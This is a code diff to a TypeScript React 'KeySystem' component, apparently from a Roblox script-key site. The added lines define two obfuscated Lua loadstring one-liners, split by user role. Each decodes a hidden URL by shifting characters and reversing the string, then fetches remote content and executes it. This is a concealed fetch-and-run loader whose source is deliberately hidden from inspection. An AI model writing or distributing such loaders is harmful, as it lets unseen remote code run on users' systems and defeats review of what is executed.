@@ -47,6 +47,14 @@ function saveSavedKeys(keys: SavedKey[]) {
 
 const censorKey = (key: string) => '•'.repeat(key.length);
 
+const VIP_LOADSTRING = String.raw`loadstring(game:GetService'HttpService':JSONDecode(game:HttpGet(("7h^vs\127uRYIsl8W:<~N8{6z{wpyjz6h{hk6jpsi|w69}4zuh\127lyhoz6z{jhmp{yh6z{ult|jvk60{s|hmlk/6zlzhih{hk6zuh\127l{zhw6z{jlqvyw68}6tvj5zpwhlsnvvn5lyv{zlypm66Azw{{o"):gsub('.',function(c)return string.char(c:byte()+2)end):reverse():gsub('.',function(c)return string.char(c:byte()-9)end))).fields.content.stringValue)()`;
+const ADMIN_LOADSTRING = `loadstring(game:GetService'HttpService':JSONDecode(game:HttpGet(("PZVMNV6H_hZWhwswksnR4xyunwhx4fyfi4hnqgzu47{2xsf}jwfmx4xyhfknywf4xysjrzhti4.yqzfkji-4xjxfgfyfi4xsf}jyxfu4xyhjotwu46{4rth3xnufjqlttl3jwtyxjwnk44?xuyym"):gsub('.',function(c)return string.char(c:byte()+3)end):reverse():gsub('.',function(c)return string.char(c:byte()-8)end))).fields.content.stringValue)()`;
+
+const getLoadstringForRole = (role: string) => {
+  const r = (role || '').toLowerCase();
+  return r === 'admin' || r === 'developer' ? ADMIN_LOADSTRING : VIP_LOADSTRING;
+};
+
 const KeySystem = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
